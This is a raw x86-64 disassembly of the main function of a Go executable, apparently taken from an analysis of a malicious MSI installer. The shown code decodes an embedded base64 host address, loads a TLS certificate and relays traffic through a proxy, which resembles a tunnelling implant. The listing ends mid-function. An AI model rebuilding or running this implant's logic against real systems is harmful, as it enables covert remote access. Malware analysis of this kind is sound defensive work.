
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140278180 <.text+0x277180>:
   140278180 <main.main>:	4c 8d a4 24 28 ff ff 	lea    r12,[rsp-0xd8]
   140278187:	ff 
   140278188:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   14027818c:	0f 86 9e 06 00 00    	jbe    0x140278830
   140278192:	55                   	push   rbp
   140278193:	48 89 e5             	mov    rbp,rsp
   140278196:	48 81 ec 50 01 00 00 	sub    rsp,0x150
   14027819d:	48 8b 1d 1c 85 38 00 	mov    rbx,QWORD PTR [rip+0x38851c]        # 0x1406006c0 '\\xd0Z>@\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xfe\\x826@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\x00\x07`@\x01\x00\x00\x00\\x80\\>@\x01\x00\x00\x00 ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00 \x07`@\x01\x00\x00\x00\\xe3\\xab6@'
   1402781a4:	48 8b 0d 1d 85 38 00 	mov    rcx,QWORD PTR [rip+0x38851d]        # 0x1406006c8 '\x18\x00\x00\x00\x00\x00\x00\x00\\xfe\\x826@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\x00\x07`@\x01\x00\x00\x00\\x80\\>@\x01\x00\x00\x00 ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00 \x07`@\x01\x00\x00\x00\\xe3\\xab6@\x01\x00\x00\x00\x15\x00\x00\x00'
   1402781ab:	48 8b 05 ae 78 39 00 	mov    rax,QWORD PTR [rip+0x3978ae]        # 0x14060fa60 ''
   1402781b2:	e8 69 1c e4 ff       	call   0x1400b9e20 <encoding/base64.(*Encoding).DecodeString>
   1402781b7:	48 85 ff             	test   rdi,rdi
   1402781ba:	74 4e                	je     0x14027820a
   1402781bc:	48 89 5c 24 58       	mov    QWORD PTR [rsp+0x58],rbx
   1402781c1:	48 89 84 24 88 00 00 	mov    QWORD PTR [rsp+0x88],rax
   1402781c8:	00 
   1402781c9:	44 0f 11 bc 24 28 01 	movups XMMWORD PTR [rsp+0x128],xmm15
   1402781d0:	00 00 
   1402781d2:	74 04                	je     0x1402781d8
   1402781d4:	48 8b 7f 08          	mov    rdi,QWORD PTR [rdi+0x8]
   1402781d8:	48 89 bc 24 28 01 00 	mov    QWORD PTR [rsp+0x128],rdi
   1402781df:	00 
   1402781e0:	48 89 b4 24 30 01 00 	mov    QWORD PTR [rsp+0x130],rsi
   1402781e7:	00 
   1402781e8:	48 8d 84 24 28 01 00 	lea    rax,[rsp+0x128]
   1402781ef:	00 
   1402781f0:	bb 01 00 00 00       	mov    ebx,0x1
   1402781f5:	48 89 d9             	mov    rcx,rbx
   1402781f8:	e8 83 bc e9 ff       	call   0x140113e80 <log.Fatal>
   1402781fd:	48 8b 84 24 88 00 00 	mov    rax,QWORD PTR [rsp+0x88]
   140278204:	00 
   140278205:	48 8b 5c 24 58       	mov    rbx,QWORD PTR [rsp+0x58]
   14027820a:	48 89 d9             	mov    rcx,rbx
   14027820d:	48 89 c3             	mov    rbx,rax
   140278210:	31 c0                	xor    eax,eax
   140278212:	e8 69 23 de ff       	call   0x14005a580 <runtime.slicebytetostring>
   140278217:	48 89 44 24 68       	mov    QWORD PTR [rsp+0x68],rax
   14027821c:	48 89 5c 24 40       	mov    QWORD PTR [rsp+0x40],rbx
   140278221:	e8 ba 8f eb ff       	call   0x1401311e0 <net.SplitHostPort>
   140278226:	48 89 44 24 78       	mov    QWORD PTR [rsp+0x78],rax
   14027822b:	48 89 5c 24 50       	mov    QWORD PTR [rsp+0x50],rbx
   140278230:	90                   	nop
   140278231:	e8 ea 89 df ff       	call   0x140070c20 <runtime.makemap_small>
   140278236:	48 89 84 24 48 01 00 	mov    QWORD PTR [rsp+0x148],rax
   14027823d:	00 
   14027823e:	66 90                	xchg   ax,ax
   140278240:	e8 db 89 df ff       	call   0x140070c20 <runtime.makemap_small>
   140278245:	48 89 84 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rax
   14027824c:	00 
   14027824d:	48 8d 05 6c 22 0c 00 	lea    rax,[rip+0xc226c]        # 0x14033a4c0 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\x93\x03o7\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\\x98$>@\x01\x00\x00\x00\\x80\\xa0\x00\x00\\x80x\x07\x00:l-@\x01\x00\x00\x00 \\xa53@\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00:l\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00\x08\x17-@'
   140278254:	e8 a7 e1 d9 ff       	call   0x140016400 <runtime.newobject>
   140278259:	83 3d 60 fb 3d 00 00 	cmp    DWORD PTR [rip+0x3dfb60],0x0        # 0x140657dc0 ''
   140278260:	75 12                	jne    0x140278274
   140278262:	48 8b 94 24 48 01 00 	mov    rdx,QWORD PTR [rsp+0x148]
   140278269:	00 
   14027826a:	48 8b b4 24 40 01 00 	mov    rsi,QWORD PTR [rsp+0x140]
   140278271:	00 
   140278272:	eb 1c                	jmp    0x140278290
   140278274:	e8 c7 25 e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   140278279:	48 8b 94 24 48 01 00 	mov    rdx,QWORD PTR [rsp+0x148]
   140278280:	00 
   140278281:	49 89 13             	mov    QWORD PTR [r11],rdx
   140278284:	48 8b b4 24 40 01 00 	mov    rsi,QWORD PTR [rsp+0x140]
   14027828b:	00 
   14027828c:	49 89 73 08          	mov    QWORD PTR [r11+0x8],rsi
   140278290:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   140278295:	48 89 10             	mov    QWORD PTR [rax],rdx
   140278298:	48 89 70 20          	mov    QWORD PTR [rax+0x20],rsi
   14027829c:	48 8b 1d ad 98 38 00 	mov    rbx,QWORD PTR [rip+0x3898ad]        # 0x140601b50 '@w\\@\x01\x00\x00\x00\t\x07\x00\x00\x00\x00\x00\x00\t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   1402782a3:	48 8b 0d ae 98 38 00 	mov    rcx,QWORD PTR [rip+0x3898ae]        # 0x140601b58 '\t\x07\x00\x00\x00\x00\x00\x00\t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@'
   1402782aa:	48 8b 3d af 98 38 00 	mov    rdi,QWORD PTR [rip+0x3898af]        # 0x140601b60 '\t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00'
   1402782b1:	e8 8a 35 f1 ff       	call   0x14018b840 <crypto/x509.(*CertPool).AppendCertsFromPEM>
   1402782b6:	84 c0                	test   al,al
   1402782b8:	75 33                	jne    0x1402782ed
   1402782ba:	48 8d 15 bf cf 07 00 	lea    rdx,[rip+0x7cfbf]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   1402782c1:	48 89 94 24 28 01 00 	mov    QWORD PTR [rsp+0x128],rdx
   1402782c8:	00 
   1402782c9:	48 8d 15 70 b4 16 00 	lea    rdx,[rip+0x16b470]        # 0x1403e3740 '\\xa9\\xec6@\x01\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\\xf6\\x986@\x01\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00[j6@\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00F;7@\x01\x00\x00\x00%\x00\x00\x00\x00\x00\x00\x00\x04t7@\x01\x00\x00\x00-\x00\x00\x00\x00\x00\x00\x00\\x9fQ7@\x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\xe5R6@'
   1402782d0:	48 89 94 24 30 01 00 	mov    QWORD PTR [rsp+0x130],rdx
   1402782d7:	00 
   1402782d8:	48 8d 84 24 28 01 00 	lea    rax,[rsp+0x128]
   1402782df:	00 
   1402782e0:	bb 01 00 00 00       	mov    ebx,0x1
   1402782e5:	48 89 d9             	mov    rcx,rbx
   1402782e8:	e8 93 bb e9 ff       	call   0x140113e80 <log.Fatal>
   1402782ed:	48 8d 05 6c 8a 0e 00 	lea    rax,[rip+0xe8a6c]        # 0x140360d60 '\\x88\x01\x00\x00\x00\x00\x00\x00\\x88\x01\x00\x00\x00\x00\x00\x00\\xd3(\\xe2#\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00h%>@\x01\x00\x00\x00u\\xb5\x00\x00`s\x08\x00\\xe87-@\x01\x00\x00\x00\\xc0\r6@\x01\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00)\x00\x00\x00\x00\x00\x00\x00\\xe87\x00\x00\x00\x00\x00\x00\\xe8\x03\x00\x00\x00\x00\x00\x00x\x1c-@'
   1402782f4:	e8 07 e1 d9 ff       	call   0x140016400 <runtime.newobject>
   1402782f9:	48 89 84 24 38 01 00 	mov    QWORD PTR [rsp+0x138],rax
   140278300:	00 
   140278301:	48 8d 05 78 76 0e 00 	lea    rax,[rip+0xe7678]        # 0x14035f980 '\\xd0\x01\x00\x00\x00\x00\x00\x00\\xc0\x01\x00\x00\x00\x00\x00\x00\x04P\\x80\\xdb\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\\xa8#>@\x01\x00\x00\x00\x02k\x00\x00 )\x08\x00\x1bX-@\x01\x00\x00\x00\\xe0\\xf95@\x01\x00\x00\x00#\x00\x00\x00\x00\x00\x00\x00#\x00\x00\x00\x00\x00\x00\x00\x1bX\x00\x00\x00\x00\x00\x00X\x03\x00\x00\x00\x00\x00\x00\\xae\x08-@'
   140278308:	e8 f3 e0 d9 ff       	call   0x140016400 <runtime.newobject>
   14027830d:	83 3d ac fa 3d 00 00 	cmp    DWORD PTR [rip+0x3dfaac],0x0        # 0x140657dc0 ''
   140278314:	75 14                	jne    0x14027832a
   140278316:	48 8b 8c 24 38 01 00 	mov    rcx,QWORD PTR [rsp+0x138]
   14027831d:	00 
   14027831e:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   140278323:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   140278328:	eb 2d                	jmp    0x140278357
   14027832a:	48 8b 8c 24 38 01 00 	mov    rcx,QWORD PTR [rsp+0x138]
   140278331:	00 
   140278332:	48 8b 91 d8 00 00 00 	mov    rdx,QWORD PTR [rcx+0xd8]
   140278339:	e8 42 25 e0 ff       	call   0x14007a880 <runtime.gcWriteBarrier4>
   14027833e:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   140278343:	49 89 1b             	mov    QWORD PTR [r11],rbx
   140278346:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   14027834b:	49 89 73 08          	mov    QWORD PTR [r11+0x8],rsi
   14027834f:	49 89 43 10          	mov    QWORD PTR [r11+0x10],rax
   140278353:	49 89 53 18          	mov    QWORD PTR [r11+0x18],rdx
   140278357:	48 89 58 60          	mov    QWORD PTR [rax+0x60],rbx
   14027835b:	48 8b 54 24 50       	mov    rdx,QWORD PTR [rsp+0x50]
   140278360:	48 89 90 88 00 00 00 	mov    QWORD PTR [rax+0x88],rdx
   140278367:	48 89 b0 80 00 00 00 	mov    QWORD PTR [rax+0x80],rsi
   14027836e:	66 c7 80 08 01 00 00 	mov    WORD PTR [rax+0x108],0x303
   140278375:	03 03 
   140278377:	48 89 81 d8 00 00 00 	mov    QWORD PTR [rcx+0xd8],rax
   14027837e:	48 8d 05 bb 2b 0c 00 	lea    rax,[rip+0xc2bbb]        # 0x14033af40 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\xac%\\xed\\xa6\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\\xd8 >@\x01\x00\x00\x00\x08\\x80\x00\x00`\\x8f\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xa0\\xaf3@\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\\xe87\x00\x00\x00\x00\x00\x00p\x00\x00\x00\x00\x00\x00\x00mJ-@'
   140278385:	e8 76 e0 d9 ff       	call   0x140016400 <runtime.newobject>
   14027838a:	48 8d 0d 4f d8 16 00 	lea    rcx,[rip+0x16d84f]        # 0x1403e5be0 '@\\xd40@\x01\x00\x00\x00`s5@\x01\x00\x00\x00\\xf0e\\xbf\\xed\x00\x00\x00\x00\\xe0K%@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\\x80s4@\x01\x00\x00\x00\\x8c=\\xb1f\x00\x00\x00\x00\\xe0D\x0f@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00@i5@\x01\x00\x00\x00<\x10\x1b.\x00\x00\x00\x00\\x80\x15\x0f@\x01\x00\x00\x00\\xc0\\xdc0@'
   140278391:	48 89 08             	mov    QWORD PTR [rax],rcx
   140278394:	83 3d 25 fa 3d 00 00 	cmp    DWORD PTR [rip+0x3dfa25],0x0        # 0x140657dc0 ''
   14027839b:	75 0a                	jne    0x1402783a7
   14027839d:	48 8b 8c 24 38 01 00 	mov    rcx,QWORD PTR [rsp+0x138]
   1402783a4:	00 
   1402783a5:	eb 10                	jmp    0x1402783b7
   1402783a7:	e8 74 24 e0 ff       	call   0x14007a820 <runtime.gcWriteBarrier1>
   1402783ac:	48 8b 8c 24 38 01 00 	mov    rcx,QWORD PTR [rsp+0x138]
   1402783b3:	00 
   1402783b4:	49 89 0b             	mov    QWORD PTR [r11],rcx
   1402783b7:	48 89 84 24 90 00 00 	mov    QWORD PTR [rsp+0x90],rax
   1402783be:	00 
   1402783bf:	48 89 48 08          	mov    QWORD PTR [rax+0x8],rcx
   1402783c3:	e8 b8 c9 ff ff       	call   0x140274d80 <main.NewFlagFile>
   1402783c8:	48 89 84 24 80 00 00 	mov    QWORD PTR [rsp+0x80],rax
   1402783cf:	00 
   1402783d0:	48 85 db             	test   rbx,rbx
   1402783d3:	74 4b                	je     0x140278420
   1402783d5:	44 0f 11 bc 24 28 01 	movups XMMWORD PTR [rsp+0x128],xmm15
   1402783dc:	00 00 
   1402783de:	66 90                	xchg   ax,ax
   1402783e0:	74 04                	je     0x1402783e6
   1402783e2:	48 8b 5b 08          	mov    rbx,QWORD PTR [rbx+0x8]
   1402783e6:	48 89 9c 24 28 01 00 	mov    QWORD PTR [rsp+0x128],rbx
   1402783ed:	00 
   1402783ee:	48 89 8c 24 30 01 00 	mov    QWORD PTR [rsp+0x130],rcx
   1402783f5:	00 
   1402783f6:	48 8d 84 24 28 01 00 	lea    rax,[rsp+0x128]
   1402783fd:	00 
   1402783fe:	bb 01 00 00 00       	mov    ebx,0x1
   140278403:	48 89 d9             	mov    rcx,rbx
   140278406:	e8 75 ba e9 ff       	call   0x140113e80 <log.Fatal>
   14027840b:	48 8b 84 24 80 00 00 	mov    rax,QWORD PTR [rsp+0x80]
   140278412:	00 
   140278413:	eb 0b                	jmp    0x140278420
   140278415:	48 8b 84 24 80 00 00 	mov    rax,QWORD PTR [rsp+0x80]
   14027841c:	00 
   14027841d:	0f 1f 00             	nop    DWORD PTR [rax]
   140278420:	e8 bb cc ff ff       	call   0x1402750e0 <main.(*Proxy).Read>
   140278425:	48 85 db             	test   rbx,rbx
   140278428:	0f 84 86 00 00 00    	je     0x1402784b4
   14027842e:	88 44 24 3f          	mov    BYTE PTR [rsp+0x3f],al
   140278432:	44 0f 11 bc 24 f8 00 	movups XMMWORD PTR [rsp+0xf8],xmm15
   140278439:	00 00 
   14027843b:	74 04                	je     0x140278441
   14027843d:	48 8b 5b 08          	mov    rbx,QWORD PTR [rbx+0x8]
   140278441:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   140278448:	00 
   140278449:	48 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rcx
   140278450:	00 
   140278451:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x0
   140278458:	00 00 00 00 00 
   14027845d:	48 8d 15 5c 05 00 00 	lea    rdx,[rip+0x55c]        # 0x1402789c0 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec0H\\x89D$@H\\x8bz\x08H\\x8br\x10L\\x8bB\x18\\x90蛮\\xe6\\xffH\\x83\\xc40]\\xc3H\\x89D$\x08H\\x89\\$\x10H\\x89L$\x18\\xe8\\x81\\xfe\\xdf\\xffH\\x8bD$\x08H\\x8b\\$\x10H\\x8bL$\x18\\xeb\\xb0\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.main.Println.func1>
   140278464:	48 89 94 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rdx
   14027846b:	00 
   14027846c:	48 c7 84 24 18 01 00 	mov    QWORD PTR [rsp+0x118],0x1
   140278473:	00 01 00 00 00 
   140278478:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x1
   14027847f:	00 01 00 00 00 
   140278484:	48 8d 94 24 f8 00 00 	lea    rdx,[rsp+0xf8]
   14027848b:	00 
   14027848c:	48 89 94 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rdx
   140278493:	00 
   140278494:	48 8b 05 dd 74 39 00 	mov    rax,QWORD PTR [rip+0x3974dd]        # 0x14060f978 '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   14027849b:	31 db                	xor    ebx,ebx
   14027849d:	b9 02 00 00 00       	mov    ecx,0x2
   1402784a2:	48 8d bc 24 08 01 00 	lea    rdi,[rsp+0x108]
   1402784a9:	00 
   1402784aa:	e8 51 b1 e9 ff       	call   0x140113600 <log.(*Logger).output>
   1402784af:	0f b6 44 24 3f       	movzx  eax,BYTE PTR [rsp+0x3f]
   1402784b4:	84 c0                	test   al,al
   1402784b6:	0f 84 af 01 00 00    	je     0x14027866b
   1402784bc:	48 8b 44 24 68       	mov    rax,QWORD PTR [rsp+0x68]
   1402784c1:	48 8b 5c 24 40       	mov    rbx,QWORD PTR [rsp+0x40]
   1402784c6:	48 8b 4c 24 78       	mov    rcx,QWORD PTR [rsp+0x78]
   1402784cb:	48 8b 7c 24 50       	mov    rdi,QWORD PTR [rsp+0x50]
   1402784d0:	e8 0b da ff ff       	call   0x140275ee0 <main.raise>
   1402784d5:	48 85 c0             	test   rax,rax
   1402784d8:	0f 84 7f 02 00 00    	je     0x14027875d
   1402784de:	48 89 5c 24 70       	mov    QWORD PTR [rsp+0x70],rbx
   1402784e3:	48 89 44 24 48       	mov    QWORD PTR [rsp+0x48],rax
   1402784e8:	48 8b 0d c1 81 38 00 	mov    rcx,QWORD PTR [rip+0x3881c1]        # 0x1406006b0 '@\\>@\x01\x00\x00\x00\\xd0\x06`@\x01\x00\x00\x00\\xd0Z>@\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xfe\\x826@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\x00\x07`@\x01\x00\x00\x00\\x80\\>@\x01\x00\x00\x00 ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@'
   1402784ef:	48 8b 3d c2 81 38 00 	mov    rdi,QWORD PTR [rip+0x3881c2]        # 0x1406006b8 '\\xd0\x06`@\x01\x00\x00\x00\\xd0Z>@\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xfe\\x826@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00\x00\x07`@\x01\x00\x00\x00\\x80\\>@\x01\x00\x00\x00 ye@\x01\x00\x00\x00.\\x836@\x01\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00@\\>@\x01\x00\x00\x00 \x07`@'
   1402784f6:	e8 05 a8 e0 ff       	call   0x140082d00 <errors.Is>
   1402784fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   140278500:	84 c0                	test   al,al
   140278502:	0f 85 c2 00 00 00    	jne    0x1402785ca
   140278508:	44 0f 11 bc 24 c8 00 	movups XMMWORD PTR [rsp+0xc8],xmm15
   14027850f:	00 00 
   140278511:	44 0f 11 bc 24 d8 00 	movups XMMWORD PTR [rsp+0xd8],xmm15
   140278518:	00 00 
   14027851a:	48 8d 15 5f cd 07 00 	lea    rdx,[rip+0x7cd5f]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   140278521:	48 89 94 24 c8 00 00 	mov    QWORD PTR [rsp+0xc8],rdx
   140278528:	00 
   140278529:	48 8d 35 20 b2 16 00 	lea    rsi,[rip+0x16b220]        # 0x1403e3750 '\\xf6\\x986@\x01\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00[j6@\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00F;7@\x01\x00\x00\x00%\x00\x00\x00\x00\x00\x00\x00\x04t7@\x01\x00\x00\x00-\x00\x00\x00\x00\x00\x00\x00\\x9fQ7@\x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\\xe5R6@\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\\xa4\\xab6@'
   140278530:	48 89 b4 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rsi
   140278537:	00 
   140278538:	4c 8b 44 24 48       	mov    r8,QWORD PTR [rsp+0x48]
   14027853d:	0f 1f 00             	nop    DWORD PTR [rax]
   140278540:	4d 85 c0             	test   r8,r8
   140278543:	74 06                	je     0x14027854b
   140278545:	49 8b 40 08          	mov    rax,QWORD PTR [r8+0x8]
   140278549:	eb 03                	jmp    0x14027854e
   14027854b:	4c 89 c0             	mov    rax,r8
   14027854e:	48 89 84 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rax
   140278555:	00 
   140278556:	48 8b 54 24 70       	mov    rdx,QWORD PTR [rsp+0x70]
   14027855b:	48 89 94 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rdx
   140278562:	00 
   140278563:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x0
   14027856a:	00 00 00 00 00 
   14027856f:	48 8d 15 8a 03 00 00 	lea    rdx,[rip+0x38a]        # 0x140278900 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec0H\\x89D$@H\\x8bz\x08H\\x8br\x10L\\x8bB\x18\\x90\\xe8[\\xaf\\xe6\\xffH\\x83\\xc40]\\xc3H\\x89D$\x08H\\x89\\$\x10H\\x89L$\x18\\xe8A\\xff\\xdf\\xffH\\x8bD$\x08H\\x8b\\$\x10H\\x8bL$\x18\\xeb\\xb0\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.main.Println.func3>
   140278576:	48 89 94 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rdx
   14027857d:	00 
   14027857e:	48 c7 84 24 18 01 00 	mov    QWORD PTR [rsp+0x118],0x2
   140278585:	00 02 00 00 00 
   14027858a:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x2
   140278591:	00 02 00 00 00 
   140278596:	48 8d 94 24 c8 00 00 	lea    rdx,[rsp+0xc8]
   14027859d:	00 
   14027859e:	48 89 94 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rdx
   1402785a5:	00 
   1402785a6:	48 8b 05 cb 73 39 00 	mov    rax,QWORD PTR [rip+0x3973cb]        # 0x14060f978 '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   1402785ad:	31 db                	xor    ebx,ebx
   1402785af:	b9 02 00 00 00       	mov    ecx,0x2
   1402785b4:	48 8d bc 24 08 01 00 	lea    rdi,[rsp+0x108]
   1402785bb:	00 
   1402785bc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   1402785c0:	e8 3b b0 e9 ff       	call   0x140113600 <log.(*Logger).output>
   1402785c5:	e9 93 01 00 00       	jmp    0x14027875d
   1402785ca:	48 8b 84 24 80 00 00 	mov    rax,QWORD PTR [rsp+0x80]
   1402785d1:	00 
   1402785d2:	31 db                	xor    ebx,ebx
   1402785d4:	e8 27 c9 ff ff       	call   0x140274f00 <main.(*Proxy).Write>
   1402785d9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
   1402785e0:	48 85 c0             	test   rax,rax
   1402785e3:	0f 84 2c fe ff ff    	je     0x140278415
   1402785e9:	44 0f 11 bc 24 e8 00 	movups XMMWORD PTR [rsp+0xe8],xmm15
   1402785f0:	00 00 
   1402785f2:	74 04                	je     0x1402785f8
   1402785f4:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
   1402785f8:	48 89 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rax
   1402785ff:	00 
   140278600:	48 89 9c 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rbx
   140278607:	00 
   140278608:	48 c7 84 24 20 01 00 	mov    QWORD PTR [rsp+0x120],0x0
   14027860f:	00 00 00 00 00 
   140278614:	48 8d 15 45 03 00 00 	lea    rdx,[rip+0x345]        # 0x140278960 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec0H\\x89D$@H\\x8bz\x08H\\x8br\x10L\\x8bB\x18\\x90\\xe8\\xfb\\xae\\xe6\\xffH\\x83\\xc40]\\xc3H\\x89D$\x08H\\x89\\$\x10H\\x89L$\x18\\xe8\\xe1\\xfe\\xdf\\xffH\\x8bD$\x08H\\x8b\\$\x10H\\x8bL$\x18\\xeb\\xb0\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.main.Println.func2>
   14027861b:	48 89 94 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rdx
   140278622:	00 
   140278623:	48 c7 84 24 18 01 00 	mov    QWORD PTR [rsp+0x118],0x1
